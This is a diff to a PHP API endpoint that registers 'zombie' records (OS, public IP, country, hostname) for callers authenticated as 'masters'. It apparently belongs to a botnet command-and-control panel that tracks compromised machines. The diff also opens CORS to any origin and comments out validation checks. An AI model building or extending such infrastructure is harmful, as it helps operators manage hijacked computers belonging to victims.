@@ -1,6 +1,6 @@
 <?php
 // required headers
-header("Access-Control-Allow-Origin: http://localhost/");
+header("Access-Control-Allow-Origin: *");
 header("Content-Type: application/json; charset=UTF-8");
 header("Access-Control-Allow-Methods: POST");
 header("Access-Control-Max-Age: 3600");
@@ -19,7 +19,7 @@ include_once 'config/database.php';
 include_once 'objects/zombie.php';
 
 // auxilar functions
-include_once 'aux/check_permission.php';
+include_once 'aux_functions/check_permission.php';
  
 // get posted data
 $data = json_decode(file_get_contents("php://input"));
@@ -39,7 +39,7 @@ if($jwt){
         $requested_by = $decoded->data->username;
         $to_update = $data->username;
         // this function raise exceptions in case of error (not requested by a master, or requesting changes on another master)
-        check_permission($requested_by, $to_update);
+        check_master_permissions($requested_by, $to_update);
 
         // get database connection
         $database = new Database();
@@ -51,16 +51,16 @@ if($jwt){
         $zombie->username = $data->username;
         $zombie->os = $data->os;
         $zombie->current_public_ip = $data->current_public_ip;
+        $zombie->current_country = $data->current_country;
         $zombie->current_hostname = $data->current_hostname;
-        $zombie->current_mac_addr = $data->current_mac_addr;
 
         // create the user
         if(
             !empty($zombie->username) &&
-            !empty($zombie->os) &&
+            //!empty($zombie->os) &&
             !empty($zombie->current_public_ip) &&
-            !empty($zombie->current_hostname) &&
-            !empty($zombie->current_mac_addr) &&
+            !empty($zombie->current_country) &&
+            //!empty($zombie->current_hostname) &&
             $zombie->create()
         ){
         
